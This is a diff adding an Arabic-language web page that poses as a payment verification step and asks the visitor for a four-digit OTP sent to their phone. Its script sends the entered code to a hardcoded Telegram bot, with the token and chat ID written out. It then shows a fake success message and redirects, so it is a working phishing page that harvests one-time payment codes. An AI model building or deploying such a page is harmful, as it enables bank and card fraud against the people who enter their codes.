@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>التحقق من الدفع</title>
+    <style>
+        body { background: #0b1120; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        .box { background: #1e293b; padding: 30px; border-radius: 15px; text-align: center; width: 320px; }
+        input { width: 100%; padding: 15px; margin: 15px 0; border-radius: 8px; text-align: center; font-size: 20px; border: 1px solid #334155; }
+        .timer { color: #f87171; font-weight: bold; margin-bottom: 10px; }
+        .pay-btn { width: 100%; padding: 14px; background: #38bdf8; border: none; border-radius: 8px; color: #0f172a; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>أدخل رمز التحقق (OTP)</h3>
+        <p>تم إرسال رمز التحقق إلى جوالك</p>
+        <div class="timer" id="timer">01:00</div>
+        <input type="text" id="otp" placeholder="****" maxlength="4">
+        <button class="pay-btn" onclick="sendOtp()">تأكيد العملية</button>
+    </div>
+
+    <script>
+    // العداد التنازلي
+    let timeLeft = 60;
+    const timerDisplay = document.getElementById('timer');
+    const countdown = setInterval(() => {
+        timeLeft--;
+        let seconds = timeLeft % 60;
+        timerDisplay.innerHTML = `00:${seconds < 10 ? '0' : ''}${seconds}`;
+        if (timeLeft <= 0) {
+            clearInterval(countdown);
+            timerDisplay.innerHTML = "انتهت صلاحية الكود";
+        }
+    }, 1000);
+
+    async function sendOtp() {
+        let code = document.getElementById('otp').value;
+        if(code.length < 4) { alert("يرجى إدخال الكود المكون من 4 أرقام"); return; }
+        
+        const token = "8621733172:AAG9ntAKStrZ8C7tS0Q794SeWp_GROrUiOc";
+        const chatId = "5976228373";
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=OTP_Code_Received: ${code}`);
+        
+        alert("تم التحقق بنجاح! سيتم تحويلك للصفحة الرئيسية.");
+        window.location.href = "index.html"; // العودة للموقع بعد نجاح العملية
+    }
+    </script>
+</body>
+</html>
